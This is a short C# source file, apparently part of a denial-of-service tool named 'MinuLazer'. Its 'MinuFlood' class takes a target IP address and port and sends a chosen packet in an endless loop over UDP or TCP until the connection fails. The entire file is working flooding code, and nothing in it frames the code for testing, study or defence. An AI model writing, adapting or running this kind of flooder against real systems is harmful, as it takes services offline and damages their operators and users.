using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace MinuLazer
{
    public class MinuFlood
    {
        Socket tcp;
        Socket udp;

        public void Shoot(string ip, int port, byte[] packet, int method)
        {
            Method methods = new Method();
            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse(ip), port);

            tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            
            if (method == methods.METHOD_UDP)
            {
                while (true)
                {
                    try
                    {
                        udp.SendTo(packet, ipep);
                    }
                    catch { return;  };
                }
            }

            else if (method == methods.METHOD_TCP)
            {
                tcp.Connect(ipep);

                while (true)
                {
                    try
                    {
                        tcp.Send(packet, SocketFlags.None);
                    }
                    catch { return; };
                }
            }
        }

        public void Stop()
        {
            udp.Close();
            tcp.Close();
        }
    }
}